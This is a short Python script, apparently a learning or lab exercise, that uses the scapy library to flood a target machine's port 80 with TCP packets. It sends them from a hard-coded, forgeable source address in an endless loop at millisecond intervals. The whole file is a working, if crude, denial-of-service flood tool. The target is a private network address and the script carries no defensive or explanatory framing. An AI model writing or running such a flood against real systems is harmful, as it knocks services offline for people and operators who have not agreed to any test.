# -*- coding: utf-8 -*-
"""
Created on Tue Aug 18 17:27:45 2020

@author: fikirsanat
"""

from scapy.all import *
source_IP = '192.168.1.38'#input("Enter IP address of Source: ")
target_IP = '192.168.1.60'#input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1
while True:
   IP1 = IP(src = source_IP, dst = target_IP)
   TCP1 = TCP(sport = source_port, dport= 80)
   pkt = IP1 / TCP1
   send(pkt, inter = .001)
   
   print ("packet sent ", i)
   i = i + 1